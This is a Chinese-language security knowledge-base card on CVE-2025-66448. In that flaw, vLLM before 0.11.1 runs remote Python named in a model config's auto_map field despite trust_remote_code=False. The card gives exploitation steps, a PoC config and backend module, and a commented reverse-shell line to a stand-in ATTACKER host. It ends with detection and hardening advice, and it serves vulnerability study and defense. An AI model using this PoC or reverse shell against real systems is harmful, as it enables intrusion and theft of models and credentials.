---
id: ai-security-supply-chain-vllm-nemotron-config-auto-map-rce
title: vLLM <0.11.1 Nemotron_Nano_VL_Config auto_map 绕过 trust_remote_code：加载模型即执行远程 Python（CVE-2025-66448）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: vllm-nemotron-config-auto-map-dynamic-module-rce
aliases:
- CVE-2025-66448
- vLLM Nemotron_Nano_VL_Config
- auto_map 远程代码执行
- trust_remote_code 绕过
- 恶意模型仓库 RCE
tags:
- vllm
- huggingface
- auto-map
- model-loading
- trust-remote-code
- supply-chain
- rce
- cve
cve:
- CVE-2025-66448
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: vLLM < 0.11.1（0.11.1 修复）
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-06T10:20:35+08:00'
  notes: V163 指出该 CVE-2025-66448 与既有 CVE-2026-22807 卡不同（get_config 入口/删除配置类修复），dedup 误判重复；已恢复草稿并以 --force 入库后 verify
---

## 一句话结论

vLLM 0.11.1 之前，自定义配置类 `Nemotron_Nano_VL_Config` 在解析模型 `config.json` 的 `auto_map` 时，会无条件调用 `get_class_from_dynamic_module(...)` 下载并实例化远程仓库中的 Python 类；该路径没有 `trust_remote_code` 参数，即使用户显式设置 `trust_remote_code=False`，加载一个“前端看似无害、`auto_map` 指向恶意后端仓库”的模型仍会在受害者主机上执行任意代码（CVE-2025-66448）。

## 原理

- Hugging Face 的 `config.json` 支持 `auto_map` 字段，用字符串指定自定义配置类的位置，例如：
  ```json
  {"auto_map": {"AutoConfig": "my_malicious_repo--main--MaliciousConfig"}}
  ```
  正常情况下，`transformers` 只有在 `trust_remote_code=True` 时才会下载并导入该模块。
- vLLM 为支持 Nemotron Nano VL 模型，内置了 `Nemotron_Nano_VL_Config` 配置类；加载模型配置时，vLLM 的 `transformers_utils/config.py` 识别到 `auto_map` 后，会调用 `try_get_class_from_dynamic_module` 解析并实例化对应类。
- `try_get_class_from_dynamic_module` 是对 `transformers.dynamic_module_utils.get_class_from_dynamic_module` 的薄封装：
  - 签名中没有 `trust_remote_code` 参数，也不读取环境/配置中的该标志；
  - 内部直接调用底层函数，后者会从远程 Hub 下载 Python 源码、用 `importlib` 执行并实例化类；
  - 异常被捕获后只记录 warning 并返回 `None`（静默失败），成功加载时也没有安全提示。
- 因此安全开关“在 API 层存在、在真正执行风险动作的底层缺失”：`get_config(..., trust_remote_code=False)` 传入后，`auto_map` 分支仍然下载并执行远程代码。Python 的 import 语义是“导入即执行”，模块顶层代码在实例化前就运行。
- 攻击者可拆分仓库：前端仓库只放一个看似合法的 `config.json`，`auto_map` 指向另一个攻击者控制的后端仓库；受害者只需加载前端模型，后端代码即在模型加载阶段执行。
- 修复（0.11.1）不是给调用点补 `trust_remote_code`，而是直接移除触发路径：删除 `nemotron_vl.py` 中的 `Nemotron_Nano_VL_Config`、从 `configs/__init__.py` 的 import/`__all__` 中移除该类，并把 `Llama_Nemotron_Nano_VL` 的映射改为 `{"attn_implementation": "eager"}`，使攻击者无法再通过该 model_type 走到动态加载。

## 触发条件

- 目标运行 vLLM < 0.11.1（0.11.1 修复）。
- 受害者加载的模型仓库/本地模型目录的 `config.json` 含攻击者可控的 `auto_map`，其 `AutoConfig`（或相关键）指向可下载/可导入的恶意 Python 模块。
- 加载过程能访问该模块所在仓库（Hugging Face Hub、ModelScope、本地路径或可控缓存），且 vLLM 进程有权限执行 Python。
- 用户即使设置了 `trust_remote_code=False` 也不构成防护。

## 利用步骤

1. 准备恶意后端仓库：放置 `malicious.py`，模块顶层执行命令/反弹 shell，并定义 `MaliciousConfig` 类。
2. 准备前端仓库：`config.json` 的 `auto_map` 指向后端仓库，例如：
   ```json
   {
     "model_type": "nemotron_nano_vl",
     "auto_map": {
       "AutoConfig": "attacker/backend-repo--main--MaliciousConfig"
     }
   }
   ```
3. 诱导受害者用 vLLM 加载前端模型：`vllm serve attacker/front-repo` 或 `LLM(model="attacker/front-repo", trust_remote_code=False)`。
4. vLLM 解析配置 → `try_get_class_from_dynamic_module` → `get_class_from_dynamic_module` 下载并执行后端模块，命令在模型加载阶段运行。
5. 验证：观察进程子进程/回连/文件写入；成功后替换为反弹 shell、窃取模型与凭证、修改权重或横向移动。

## PoC

```json
{
  "model_type": "nemotron_nano_vl",
  "auto_map": {
    "AutoConfig": "attacker/backend-repo--main--MaliciousConfig"
  }
}
```

```python
# 后端仓库 malicious.py：模块顶层代码在 import/exec_module 时立即执行
import os
os.system("id > /tmp/vllm_pwned")
# 或反弹 shell：os.system("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")

class MaliciousConfig:
    pass
```

```python
# 受害者侧：trust_remote_code=False 仍会执行
from vllm import LLM
llm = LLM(model="attacker/front-repo", trust_remote_code=False)
```

## 变体与关联

- 同一 wrapper 的其他调用点：vLLM 的 `ModelRegistry._try_resolve_transformers()` 也曾漏传 `trust_remote_code`（另一 CVE，见 [[ai-security-supply-chain-vllm-auto-map-trust-remote-code-bypass]]）；审计时应搜索所有 `get_class_from_dynamic_module`/`exec_module` 调用。
- `auto_map` 的其他键：`AutoModel`、`AutoTokenizer`、`AutoConfig` 等都可能指向恶意模块；只要目标代码不校验 `trust_remote_code`，就能触发。
- 投毒方式：直接发布恶意模型、污染合法仓库/缓存、在本地模型目录放置恶意文件；前端/后端仓库拆分可绕过只检查前端仓库的安全扫描。
- 关联：[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（模型权重 pickle 反序列化 RCE）、[[ai-security-supply-chain-pytorch-export-load-use-pickle-rce]]（torch.load 模型加载 RCE）。
- 边界：0.11.1+ 已删除 Nemotron_Nano_VL_Config 路径；若目标使用其他仍存在缺陷的自定义配置类/调用点，可能仍有同类问题，需要按实际版本审计。

## 检测与防御

- 检测：检查 vLLM 版本是否 <0.11.1；审计模型 `config.json` 中的 `auto_map` 是否指向非预期仓库；监控模型加载阶段的异常子进程、外连与文件写入；日志中出现 `Unable to load ... from HF Hub` 的 warning 也可能是探测/失败尝试。
- 修复：升级到 0.11.1+；不要加载来源不明的模型仓库；对模型仓库做 `auto_map`/自定义代码静态扫描。
- 加固：在无网络/无敏感凭证的沙箱中加载模型；限制 vLLM 进程权限；对模型仓库做签名/哈希校验；默认禁止远程代码并确保所有动态加载入口都强制执行该策略。
